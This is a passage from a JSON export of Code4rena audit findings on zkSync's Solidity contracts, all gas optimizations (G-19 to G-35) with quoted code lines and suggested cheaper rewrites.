      "content": "\n**Files:** `L2ContractHelper.sol`, `Compressor.sol`, `Executor.sol`, `Merkle.sol`\n\n[File: code/system-contracts/contracts/Compressor.sol](https://github.com/code-423n4/2024-03-zksync/blob/main/code/system-contracts/contracts/Compressor.sol#L52)\n```solidity\n52:                 encodedData.length * 4 == _bytecode.length,\n[...]\n57:                 dictionary.length / 8 <= encodedData.length / 2,\n[...]\n62:                 uint256 indexOfEncodedChunk = uint256(encodedData.readUint16(encodedDataPointer)) * 8;\n[...]\n66:                 uint64 realChunk = _bytecode.readUint64(encodedDataPointer * 4);\n```\n\n[File: code/contracts/ethereum/contracts/state-transition/libraries/Merkle.sol](https://github.com/code-423n4/2024-03-zksync/blob/main/code/contracts/ethereum/contracts/state-transition/libraries/Merkle.sol#L33)\n```solidity\n33:             _index /= 2;\n```\n[File: code/contracts/ethereum/contracts/common/libraries/L2ContractHelper.sol](https://github.com/code-423n4/2024-03-zksync/blob/main/code/contracts/ethereum/contracts/common/libraries/L2ContractHelper.sol#L25)\n```solidity\n25:         uint256 bytecodeLenInWords = _bytecode.length / 32;\n26:         require(bytecodeLenInWords < 2 ** 16, \"pp\"); // bytecode length must be less than 2^16 words\n```\n\n[File: code/contracts/ethereum/contracts/state-transition/chain-deps/facets/Executor.sol](https://github.com/code-423n4/2024-03-zksync/blob/main/code/contracts/ethereum/contracts/state-transition/chain-deps/facets/Executor.sol#L581)\n```solidity\n581:             blobAuxOutputWords[i * 2] = _blobHashes[i];\n582:             blobAuxOutputWords[i * 2 + 1] = _blobCommitments[i];\n```\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "zkSync",
      "source_link": "https://code4rena.com/reports/2024-03-zksync",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "33280",
      "title": "[G-35] Avoid declaring unused variables",
      "impact": "GAS",
      "content": "\n**File:** `Constants.sol`\n\n[File: code/system-contracts/contracts/Constants.sol](https://github.com/code-423n4/2024-03-zksync/blob/main/code/system-contracts/contracts/Constants.sol#L93)\n```solidity\n93: /// @dev The maximal msg.value that context can have\n94: uint256 constant MAX_MSG_VALUE = 2 ** 128 - 1;\n```\n\nConstant `MAX_MSG_VALUE` is not used anymore, thus it should be removed from `Constants.sol`\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "zkSync",
      "source_link": "https://code4rena.com/reports/2024-03-zksync",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "33279",
      "title": "[G-34] Do not declare variables inside loop",
      "impact": "GAS",
      "content": "\n**Files:** `Compressor.sol`, `Mailbox.sol`, `ImmutableSimulator.sol`, `ValidatorTimelock.sol`, `Executor.sol`\n\nMove variable declaration outside the loop. While the variable is declared inside the loop - every loop iteration will spend gas on that variable declaration.\n\n[File: code/system-contracts/contracts/ImmutableSimulator.sol](https://github.com/code-423n4/2024-03-zksync/blob/main/code/system-contracts/contracts/ImmutableSimulator.sol#L38)\n```solidity\n38:             for (uint256 i = 0; i < immutablesLength; ++i) {\n39:                 uint256 index = _immutables[i].index;\n40:                 bytes32 value = _immutables[i].value;\n```\n\nshould be changed to:\n\n```\n    uint256 index;\n    bytes32 value;\n    for (uint256 i = 0; i < immutablesLength; ++i) {\n        index = _immutables[i].index;\n        value = _immutables[i].value;\n```\n[File: code/system-contracts/contracts/Compressor.sol](https://github.com/code-423n4/2024-03-zksync/blob/main/code/system-contracts/contracts/Compressor.sol#L61)\n```solidity\n61:             for (uint256 encodedDataPointer = 0; encodedDataPointer < encodedData.length; encodedDataPointer += 2) {\n62:                 uint256 indexOfEncodedChunk = uint256(encodedData.readUint16(encodedDataPointer)) * 8;\n```\n\nshould be changed to:\n\n```\n            uint256 indexOfEncodedChunk;\n            for (uint256 encodedDataPointer = 0; encodedDataPointer < encodedData.length; encodedDataPointer += 2) {\n                indexOfEncodedChunk = uint256(encodedData.readUint16(encodedDataPointer)) * 8;\n```\n\n[File: code/contracts/ethereum/contracts/state-transition/chain-deps/facets/Executor.sol](https://github.com/code-423n4/2024-03-zksync/blob/main/code/contracts/ethereum/contracts/state-transition/chain-deps/facets/Executor.sol#L289)\n```solidity\n289:         for (uint256 i = 0; i < _newBatchesData.length; i = i.uncheckedInc()) {\n290:             // The upgrade transaction must only be included in the first batch.\n291:             bytes32 expectedUpgradeTxHash = i == 0 ? _systemContractUpgradeTxHash : bytes32(0);\n```\n\nShould be changed to:\n\n```\n        bytes32 expectedUpgradeTxHash;\n        for (uint256 i = 0; i < _newBatchesData.length; i = i.uncheckedInc()) {\n            // The upgrade transaction must only be included in the first batch.\n            expectedUpgradeTxHash = i == 0 ? _systemContractUpgradeTxHash : bytes32(0);\n```\n\n[File: code/contracts/ethereum/contracts/state-transition/chain-deps/facets/Mailbox.sol](https://github.com/code-423n4/2024-03-zksync/blob/main/code/contracts/ethereum/contracts/state-transition/chain-deps/facets/Mailbox.sol#L356)\n```solidity\n356:         for (uint256 i = 0; i < factoryDepsLen; i = i.uncheckedInc()) {\n357:             bytes32 hashedBytecode = L2ContractHelper.hashL2Bytecode(_factoryDeps[i]);\n```\n\nShould be changed to:\n\n```\n        bytes32 hashedBytecode;\n        for (uint256 i = 0; i < factoryDepsLen; i = i.uncheckedInc()) {\n            hashedBytecode = L2ContractHelper.hashL2Bytecode(_factoryDeps[i]);\n```\n\n[File: code/contracts/ethereum/contracts/state-transition/ValidatorTimelock.sol](https://github.com/code-423n4/2024-03-zksync/blob/main/code/contracts/ethereum/contracts/state-transition/ValidatorTimelock.sol#L185)\n```solidity\n185:             for (uint256 i = 0; i < _newBatchesData.length; ++i) {\n186:                 uint256 commitBatchTimestamp = committedBatchTimestamp[ERA_CHAIN_ID].get(\n```\n\nShould be changed to:\n\n```\n            uint256 commitBatchTimestamp;\n            for (uint256 i = 0; i < _newBatchesData.length; ++i) {\n                commitBatchTimestamp = committedBatchTimestamp[ERA_CHAIN_ID].get(\n```\n[File: code/contracts/ethereum/contracts/state-transition/ValidatorTimelock.sol](https://github.com/code-423n4/2024-03-zksync/blob/main/code/contracts/ethereum/contracts/state-transition/ValidatorTimelock.sol#L209)\n```solidity\n209:             for (uint256 i = 0; i < _newBatchesData.length; ++i) {\n210:                 uint256 commitBatchTimestamp = committedBatchTimestamp[_chainId].get(_newBatchesData[i].batchNumber);\n```\n\nShould be changed to:\n\n```\n            uint256 commitBatchTimestamp;\n            for (uint256 i = 0; i < _newBatchesData.length; ++i) {\n                commitBatchTimestamp = committedBatchTimestamp[_chainId].get(_newBatchesData[i].batchNumber);\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "zkSync",
      "source_link": "https://code4rena.com/reports/2024-03-zksync",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "33278",
      "title": "[G-33] Use short-circuiting in OR operations",
      "impact": "GAS",
      "content": "\n**File:** `NonceHolder.sol`\n\nSolidity uses short-circuiting while performing OR operations. This means, that in the expression `A() OR B()` - when `A()` evaluates to `true` - expression `B()` won't be executed (because `true OR whatever` evaluates to `true`).\nThis behavior suggests, that it's better to use less-gas-costly operation first (if it will be evaluated to `true`, Solidity won't waste gas on executing the 2nd operation). \n\n[File: code/system-contracts/contracts/NonceHolder.sol](https://github.com/code-423n4/2024-03-zksync/blob/main/code/system-contracts/contracts/NonceHolder.sol#L156)\n```solidity\n156:         return (_nonce < getMinNonce(_address) || nonceValues[addressAsKey][_nonce] > 0);\n```\n\nFunction `getMinNonce()` reads state variable and performs multiple of other operations. This means, that it uses more gas than just reading `nonceValues[addressAsKey][_nonce]` state variable and comparing it to `0`. Above code should be rewritten to:\n\n```\n return (nonceValues[addressAsKey][_nonce] > 0 || _nonce < getMinNonce(_address));\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "zkSync",
      "source_link": "https://code4rena.com/reports/2024-03-zksync",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "33277",
      "title": "[G-32] Execute `require` before other operations",
      "impact": "GAS",
      "content": "\n**Files:** `GasBoundCaller.sol`, `Executor.sol`\n\nBecause `require` reverts the whole operation, it's better to perform `require` statements before any other operation. When `require` reverts, function won't use additional gas for other operations.\n\n[File: code/system-contracts/contracts/GasBoundCaller.sol](https://github.com/code-423n4/2024-03-zksync/blob/main/code/system-contracts/contracts/GasBoundCaller.sol#L40)\n```solidity\n40:         uint256 expectedForCompute = gasleft() + CALL_ENTRY_OVERHEAD;\n[...]\n46:         require(_maxTotalGas >= gasleft(), \"Gas limit is too low\");\n```\n\nWe can move `require` from line 46 above line 40. When `_maxTotalGas` won't be greater or equal `gasleft()` - function will revert immediately, thus we won't waste additional gas on `expectedForCompute` assignment.\n\n[File: code/contracts/ethereum/contracts/state-transition/chain-deps/facets/Executor.sol](https://github.com/code-423n4/2024-03-zksync/blob/main/code/contracts/ethereum/contracts/state-transition/chain-deps/facets/Executor.sol#L356)\n```solidity\n356:         uint256 newTotalBatchesExecuted = s.totalBatchesExecuted + nBatches;\n357:         s.totalBatchesExecuted = newTotalBatchesExecuted;\n358:         require(newTotalBatchesExecuted <= s.totalBatchesVerified, \"n\"); // Can't execute batches more than committed and proven currently.\n```\n\nWe can move `require` from line 358, before line 357. When condition `newTotalBatchesExecuted <= s.totalBatchesVerified` won't be fulfilled, function will revert without wasting gas on executing line 357. The fixed code should look like this:\n\n```\n        uint256 newTotalBatchesExecuted = s.totalBatchesExecuted + nBatches;\n        require(newTotalBatchesExecuted <= s.totalBatchesVerified, \"n\"); // Can't execute batches more than committed and proven currently.\n        s.totalBatchesExecuted = newTotalBatchesExecuted;\n```\n\n[File: code/contracts/ethereum/contracts/state-transition/chain-deps/facets/Executor.sol](https://github.com/code-423n4/2024-03-zksync/blob/main/code/contracts/ethereum/contracts/state-transition/chain-deps/facets/Executor.sol#L629)\n```solidity\n629:         uint256 versionedHashIndex = 0;\n630: \n631:         require(_pubdataCommitments.length > 0, \"pl\");\n632:         require(_pubdataCommitments.length <= PUBDATA_COMMITMENT_SIZE * MAX_NUMBER_OF_BLOBS, \"bd\");\n633:         require(_pubdataCommitments.length % PUBDATA_COMMITMENT_SIZE == 0, \"bs\");\n```\n\nMove `require` statements from lines 631, 632, 633 above line 629. If any of these `require` revert, function won't waste additional gas on `versionedHashIndex` initialization.\n \n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "zkSync",
      "source_link": "https://code4rena.com/reports/2024-03-zksync",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "33276",
      "title": "[G-31]  Use `require` which costs less gas first",
      "impact": "GAS",
      "content": "\n**Files:** `Executor.sol`, `BaseZkSyncUpgrade.sol`, `L2SharedBridge.sol`, `Admin.sol`\n\nBecause failed `require` revert the whole operation - it's more profitable to use `require` which spends less gas first.\n\n[File: code/contracts/zksync/contracts/bridge/L2SharedBridge.sol](https://github.com/code-423n4/2024-03-zksync/blob/main/code/contracts/zksync/contracts/bridge/L2SharedBridge.sol#L87)\n```solidity\n87:         require(\n88:             AddressAliasHelper.undoL1ToL2Alias(msg.sender) == l1Bridge ||\n89:                 AddressAliasHelper.undoL1ToL2Alias(msg.sender) == l1LegacyBridge,\n90:             \"mq\"\n91:         );\n92:         require(msg.value == 0, \"Value should be 0 for ERC20 bridge\");\n```\n\nReading `msg.value` costs less gas than reading `l1Bridge` and `l1LegacyBridge`, thus order of `require` can be changed.\n\n[File: code/contracts/ethereum/contracts/upgrades/BaseZkSyncUpgrade.sol](https://github.com/code-423n4/2024-03-zksync/blob/main/code/contracts/ethereum/contracts/upgrades/BaseZkSyncUpgrade.sol#L223)\n```solidity\n223:         require(_factoryDeps.length == _expectedHashes.length, \"Wrong number of factory deps\");\n224:         require(_factoryDeps.length <= MAX_NEW_FACTORY_DEPS, \"Factory deps can be at most 32\");\n```\n\nComparing `_factoryDeps.length` to constant `MAX_NEW_FACTORY_DEPS` costs less gas than comparing it to length of another array: `_expectedHashes.length`. Above code should be changed to:\n\n```\nrequire(_factoryDeps.length <= MAX_NEW_FACTORY_DEPS, \"Factory deps can be at most 32\");\nrequire(_factoryDeps.length == _expectedHashes.length, \"Wrong number of factory deps\");\n```\n\n[File: code/contracts/ethereum/contracts/state-transition/chain-deps/facets/Admin.sol](https://github.com/code-423n4/2024-03-zksync/blob/main/code/contracts/ethereum/contracts/state-transition/chain-deps/facets/Admin.sol#L105)\n```solidity\n105:         require(\n106:             cutHashInput == IStateTransitionManager(s.stateTransitionManager).upgradeCutHash(_oldProtocolVersion),\n107:             \"StateTransition: cutHash mismatch\"\n108:         );\n109: \n110:         require(\n111:             s.protocolVersion == _oldProtocolVersion,\n112:             \"StateTransition: protocolVersion mismatch in STC when upgrading\"\n113:         );\n```\n\n`s.protocolVersion == _oldProtocolVersion` uses less gas than `cutHashInput == IStateTransitionManager(s.stateTransitionManager).upgradeCutHash(_oldProtocolVersion)`. The second `require` is just reading, while the first one - calling external function `upgradeCutHash()`. Thus the order of `require` should be changed.\n\n[File: code/contracts/ethereum/contracts/state-transition/chain-deps/facets/Executor.sol](https://github.com/code-423n4/2024-03-zksync/blob/main/code/contracts/ethereum/contracts/state-transition/chain-deps/facets/Executor.sol#L226)\n```solidity\n226:         require(\n227:             IStateTransitionManager(s.stateTransitionManager).protocolVersion() == s.protocolVersion,\n228:             \"Executor facet: wrong protocol version\"\n229:         );\n230:         // With the new changes for EIP-4844, namely the restriction on number of blobs per block, we only allow for a single batch to be committed at a time.\n231:         require(_newBatchesData.length == 1, \"e4\");\n```\n\n`_newBatchesData.length == 1` uses less gas than calling `protocolVersion()` in the first `require`: `IStateTransitionManager(s.stateTransitionManager).protocolVersion() == s.protocolVersion` (especially, that we expect `_newBatchesData.length` to be equal to 1). This implies, that the order of `require` statements should be changed.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "zkSync",
      "source_link": "https://code4rena.com/reports/2024-03-zksync",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "33275",
      "title": "[G-30] Some operations which won't underflow may be unchecked",
      "impact": "GAS",
      "content": "\n**Files:** `GasBoundCaller.sol`, `SystemContext.sol`, `MsgValueSimulator.sol`\n\n[File: code/system-contracts/contracts/GasBoundCaller.sol](https://github.com/code-423n4/2024-03-zksync/blob/main/code/system-contracts/contracts/GasBoundCaller.sol#L49)\n```solidity\n49:         uint256 pubdataAllowance = _maxTotalGas > expectedForCompute ? _maxTotalGas - expectedForCompute : 0;\n```\n\nSince `_maxTotalGas > expectedForCompute`, we know that `_maxTotalGas - expectedForCompute` won't underflow, thus it can be unchecked.\n\n[File: code/system-contracts/contracts/GasBoundCaller.sol](https://github.com/code-423n4/2024-03-zksync/blob/main/code/system-contracts/contracts/GasBoundCaller.sol#L63)\n```solidity\n63:         uint256 pubdataSpent = pubdataPublishedAfter > pubdataPublishedBefore\n64:             ? pubdataPublishedAfter - pubdataPublishedBefore\n65:             : 0;\n```\n\nSince `pubdataPublishedAfter > pubdataPublishedBefore`, we know that `pubdataPublishedAfter - pubdataPublishedBefore` won't underflow, thus it can be unchecked.\n\n[File: code/system-contracts/contracts/SystemContext.sol](https://github.com/code-423n4/2024-03-zksync/blob/main/code/system-contracts/contracts/SystemContext.sol#L119)\n```solidity\n119:         return pubdataPublished > basePubdataSpent ? pubdataPublished - basePubdataSpent : 0;\n```\nSince `pubdataPublished > basePubdataSpent`, we know that `pubdataPublished - basePubdataSpent` won't underflow, thus it can be unchecked.\n\n[File: code/system-contracts/contracts/MsgValueSimulator.sol](https://github.com/code-423n4/2024-03-zksync/blob/main/code/system-contracts/contracts/MsgValueSimulator.sol#L53)\n```solidity\n53:         uint256 userGas = gasInContext > MSG_VALUE_SIMULATOR_STIPEND_GAS\n54:             ? gasInContext - MSG_VALUE_SIMULATOR_STIPEND_GAS\n55:             : 0;\n```\n\nSince `gasInContext > MSG_VALUE_SIMULATOR_STIPEND_GAS`, we know that `gasInContext - MSG_VALUE_SIMULATOR_STIPEND_GAS` won't underflow, thus it can be unchecked.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "zkSync",
      "source_link": "https://code4rena.com/reports/2024-03-zksync",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "33274",
      "title": "[G-29] Use `calldata` instead of `memory`, when struct is not being changed",
      "impact": "GAS",
      "content": "\n**File:** `TransactionValidator.sol`\n\n[File: code/contracts/ethereum/contracts/state-transition/libraries/TransactionValidator.sol](https://github.com/code-423n4/2024-03-zksync/blob/main/code/contracts/ethereum/contracts/state-transition/libraries/TransactionValidator.sol#L46)\n```solidity\n46:     function validateUpgradeTransaction(L2CanonicalTransaction memory _transaction) internal pure {\n```\n\nFunction `validateUpgradeTransaction()` verifies fields of `_transaction`, but does not alter it. This implies, that instead of `memory`, `calldata` should be used.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "zkSync",
      "source_link": "https://code4rena.com/reports/2024-03-zksync",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "33273",
      "title": "[G-28] Calculate simple operations at once",
      "impact": "GAS",
      "content": "\n**File:** `TransactionValidator.sol`\n\n[File: code/contracts/ethereum/contracts/state-transition/libraries/TransactionValidator.sol](https://github.com/code-423n4/2024-03-zksync/blob/main/code/contracts/ethereum/contracts/state-transition/libraries/TransactionValidator.sol#L77)\n```solidity\n77:             costForComputation = L1_TX_INTRINSIC_L2_GAS;\n78: \n79:             // Taking into account the hashing costs that depend on the length of the transaction\n80:             // Note that L1_TX_DELTA_544_ENCODING_BYTES is the delta in the price for every 544 bytes of\n81:             // the transaction's encoding. It is taken as LCM between 136 and 32 (the length for each keccak256 round\n82:             // and the size of each new encoding word).\n83:             costForComputation += Math.ceilDiv(_encodingLength * L1_TX_DELTA_544_ENCODING_BYTES, 544);\n84: \n85:             // Taking into the account the additional costs of providing new factory dependencies\n86:             costForComputation += _numberOfFactoryDependencies * L1_TX_DELTA_FACTORY_DEPS_L2_GAS;\n87: \n88:             // There is a minimal amount of computational L2 gas that the transaction should cover\n89:             costForComputation = Math.max(costForComputation, L1_TX_MIN_L2_GAS_BASE);\n```\n\nAbove code performs redundant addition at lines 83, 86. Every time it adds the value to `costForComputation`, instead of doing it only once:\n\n```\n            costForComputation = Math.max(L1_TX_INTRINSIC_L2_GAS + Math.ceilDiv(_encodingLength * L1_TX_DELTA_544_ENCODING_BYTES, 544) + _numberOfFactoryDependencies * L1_TX_DELTA_FACTORY_DEPS_L2_GAS, L1_TX_MIN_L2_GAS_BASE);\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "zkSync",
      "source_link": "https://code4rena.com/reports/2024-03-zksync",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "33272",
      "title": "[G-27] Do not import the whole library, when only a few functions from that library are being used",
      "impact": "GAS",
      "content": "\n**File:** `Mailbox.sol`\n\n[File: code/contracts/ethereum/contracts/state-transition/chain-deps/facets/Mailbox.sol](https://github.com/code-423n4/2024-03-zksync/blob/main/code/contracts/ethereum/contracts/state-transition/chain-deps/facets/Mailbox.sol#L5)\n```solidity\n5: import {Math} from \"@openzeppelin/contracts/utils/math/Math.sol\";\n```\n\n`Mailbox.sol` imports the whole `Math.sol` library, while it only uses `Math.max()` function.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "zkSync",
      "source_link": "https://code4rena.com/reports/2024-03-zksync",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "33271",
      "title": "[G-26] Do not repeat `if` checks in `_constructContract()`",
      "impact": "GAS",
      "content": "\n**File:** `ContractDeployer.sol`\n\nFunction `_constructContract()` performs the same conditional `if` check twice. This is a waste of gas:\n\n[File: code/system-contracts/contracts/ContractDeployer.sol](https://github.com/code-423n4/2024-03-zksync/blob/main/code/system-contracts/contracts/ContractDeployer.sol#L332)\n```solidity\n332:             if (value > 0) {\n333:                 BASE_TOKEN_SYSTEM_CONTRACT.transferFromTo(address(this), _newAddress, value);\n334:             }\n335:             // 2. Set the constructed code hash on the account\n336:             _storeConstructingByteCodeHashOnAddress(_newAddress, _bytecodeHash);\n337: \n338:             // 3. Call the constructor on behalf of the account\n339:             if (value > 0) {\n340:                 // Safe to cast value, because `msg.value` <= `uint128.max` due to `MessageValueSimulator` invariant\n341:                 SystemContractHelper.setValueForNextFarCall(uint128(value));\n342:             }\n```\n\nFirstly, there's a check (line 332) if `value` is bigger then 0. Then, at line 339, the same check is being made again.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "zkSync",
      "source_link": "https://code4rena.com/reports/2024-03-zksync",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "33270",
      "title": "[G-25] Use de Morgan's laws to reduce number of negations",
      "impact": "GAS",
      "content": "\n**File:** `DiamondProxy.sol`\n\n[File: code/contracts/ethereum/contracts/state-transition/chain-deps/DiamondProxy.sol](https://github.com/code-423n4/2024-03-zksync/blob/main/code/contracts/ethereum/contracts/state-transition/chain-deps/DiamondProxy.sol#L31)\n```solidity\n31:         require(!diamondStorage.isFrozen || !facet.isFreezable, \"q1\"); // Facet is frozen\n```\n\nAccording to de Morgan's laws: `!A || !B <=> !(A & B)`, which means we can reduce one negation and rewrite above line to:\n\n```\nrequire(!(diamondStorage.isFrozen && facet.isFreezable), \"q1\"); // Facet is frozen\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "zkSync",
      "source_link": "https://code4rena.com/reports/2024-03-zksync",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "33269",
      "title": "[G-24] Redundant `require` in `BaseZkSyncUpgradeGenesis`",
      "impact": "GAS",
      "content": "\n**File:** `BaseZkSyncUpgradeGenesis.sol`\n\n[File: code/contracts/ethereum/contracts/upgrades/BaseZkSyncUpgradeGenesis.sol](https://github.com/code-423n4/2024-03-zksync/blob/main/code/contracts/ethereum/contracts/upgrades/BaseZkSyncUpgradeGenesis.sol#L22)\n```solidity\n22:         require(\n23:             // Genesis Upgrade difference: Note this is the only thing change > to >=\n24:             _newProtocolVersion >= previousProtocolVersion,\n25:             \"New protocol version is not greater than the current one\"\n26:         );\n27:         require(\n28:             _newProtocolVersion - previousProtocolVersion <= MAX_ALLOWED_PROTOCOL_VERSION_DELTA,\n29:             \"Too big protocol version difference\"\n30:         );\n```\n\nTo not revert, two conditions must occur: `_newProtocolVersion >= previousProtocolVersion` and `_newProtocolVersion - previousProtocolVersion <= MAX_ALLOWED_PROTOCOL_VERSION_DELTA`.\nHowever, please notice, that the first `require` (lines 23-26) is redundant and can be removed. When `_newProtocolVersion < previousProtocolVersion`, function will already revert due to underflow in the second `require` at line 28.\nThis basically means, that it's enough to leave just only the second `require`: (when the first condition won't be fulfilled, function will revert due to underflow in the 2nd `require`).\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "zkSync",
      "source_link": "https://code4rena.com/reports/2024-03-zksync",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "33268",
      "title": "[G-23] Use `delete` to clear data, instead of assigning data to `0`",
      "impact": "GAS",
      "content": "\n**File:** `L1Messenger.sol`\n\n[File: code/system-contracts/contracts/L1Messenger.sol](https://github.com/code-423n4/2024-03-zksync/blob/main/code/system-contracts/contracts/L1Messenger.sol#L328)\n```solidity\n328:         /// Clear logs state\n329:         chainedLogsHash = bytes32(0);\n330:         numberOfLogsToProcess = 0;\n331:         chainedMessagesHash = bytes32(0);\n332:         chainedL1BytecodesRevealDataHash = bytes32(0);\n```\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "zkSync",
      "source_link": "https://code4rena.com/reports/2024-03-zksync",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "33267",
      "title": "[G-22] Operations capped by `totalSupply` in `L2BaseToken` can be unchecked",
      "impact": "GAS",
      "content": "\n**File:** `L2BaseToken.sol`\n\n[File: code/system-contracts/contracts/L2BaseToken.sol](https://github.com/code-423n4/2024-03-zksync/blob/main/code/system-contracts/contracts/L2BaseToken.sol#L64)\n```solidity\n64:     function mint(address _account, uint256 _amount) external override onlyCallFromBootloader {\n65:         totalSupply += _amount;\n66:         balance[_account] += _amount;\n67:         emit Mint(_account, _amount);\n68:     }\n```\nUser's balance is capped by `totalSupply`. When `totalSupply += _amount` won't revert (due to overflow) - we can be sure, that `balance[_account] += _amount` won't overflow either, thus line 66 can be unchecked.\nImportant - please notice, that only line 66: `balance[_account] += _amount` can be unchecked.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "zkSync",
      "source_link": "https://code4rena.com/reports/2024-03-zksync",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "33266",
      "title": "[G-21] Do not assign `offset` in the last call of `UnsafeBytes.readUint256()` in `_parseL2WithdrawalMessage()`",
      "impact": "GAS",
      "content": "\n**File:** `L1SharedBridge.sol`\n\nA simple test in Remix IDE has been created, to compare gas usage of assigning more than one value from function call:\n\n```\n  function getUints() public pure returns (uint, uint) {return (1, 2);}\n   function funcA() public view {\n    uint a; uint b; \n    (a, b) = getUints();\n    uint g = gasleft();\n    (a, b) = getUints();\n    console.log(g - gasleft());\n   }\n    function funcB() public view {\n    uint a; uint b; \n    (a, b) = getUints();\n    uint g = gasleft();\n    (a, ) = getUints();\n    console.log(g - gasleft());\n   }\n```\n\n`funcB()` costs 74 gas, while `funcA()` costs 82 gas. This implies, that we shouldn't assign every parameter from function call if it's not needed.\n\n[File: code/contracts/ethereum/contracts/bridge/L1SharedBridge.sol](https://github.com/code-423n4/2024-03-zksync/blob/main/code/contracts/ethereum/contracts/bridge/L1SharedBridge.sol#L520)\n```solidity\n520:             (amount, offset) = UnsafeBytes.readUint256(_l2ToL1message, offset);\n```\n\nIn the last call of `UnsafeBytes.readUint256(_l2ToL1message, offset)` (line 520), we won't need `offset` anymore, thus we can remove `offset` and change this line to: `(amount, ) = UnsafeBytes.readUint256(_l2ToL1message, offset)`.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "zkSync",
      "source_link": "https://code4rena.com/reports/2024-03-zksync",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "33265",
      "title": "[G-20] Removing code related to testing - to decrease the contract size and the deployment costs",
      "impact": "GAS",
      "content": "\n**File:** `SystemContext.sol`\n\n[File: code/system-contracts/contracts/SystemContext.sol](https://github.com/code-423n4/2024-03-zksync/blob/main/code/system-contracts/contracts/SystemContext.sol#L469)\n```solidity\n469:     /// @notice A testing method that manually sets the current blocks' number and timestamp.\n470:     /// @dev Should be used only for testing / ethCalls and should never be used in production.\n471:     function unsafeOverrideBatch(\n472:         uint256 _newTimestamp,\n473:         uint256 _number,\n474:         uint256 _baseFee\n475:     ) external onlyCallFromBootloader {\n476:         BlockInfo memory newBlockInfo = BlockInfo({number: uint128(_number), timestamp: uint128(_newTimestamp)});\n477:         currentBatchInfo = newBlockInfo;\n478: \n479:         baseFee = _baseFee;\n480:     }\n```\n\nBoth NatSpec and the code-base suggests that above code is just for testing and should not be on the production.\nWhile it's not possible to use this code in a non-testing environment (`onlyCallFromBootloader` modifier won't let to call this code directly), it's recommended to remove this function.\nGetting rid of redundant functions will decrease the contract size, thus less gas will be spent during the deployment process.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "zkSync",
      "source_link": "https://code4rena.com/reports/2024-03-zksync",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "33264",
      "title": "[G-19] Checking balance after the transfer cannot underflow, thus can be unchecked",
      "impact": "GAS",
      "content": "\n**File:** `L1ERC20Bridge.sol`\n\nThis issue has been reported as separate finding, as it uses different invariant for underflow detection. While another finding uses the invariant that subtraction won't underflow, because `require` guarantees that subtrahend is lower than minuend, this one utilizes the fact that after the transfer, the balance cannot be lower then the balance before the transfer, thus line 165 won't underflow and can be unchecked.\n\n[File: code/contracts/ethereum/contracts/bridge/L1ERC20Bridge.sol](https://github.com/code-423n4/2024-03-zksync/blob/main/code/contracts/ethereum/contracts/bridge/L1ERC20Bridge.sol#L161)\n```solidity\n161:         uint256 balanceBefore = _token.balanceOf(address(sharedBridge));\n162:         _token.safeTransferFrom(_from, address(sharedBridge), _amount);\n163:         uint256 balanceAfter = _token.balanceOf(address(sharedBridge));\n164: \n165:         return balanceAfter - balanceBefore;\n```\n\nBalance after the transfer cannot be lower then before the transfer, thus `balanceAfter - balanceBefore` won't underflow and can be unchecked.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "zkSync",
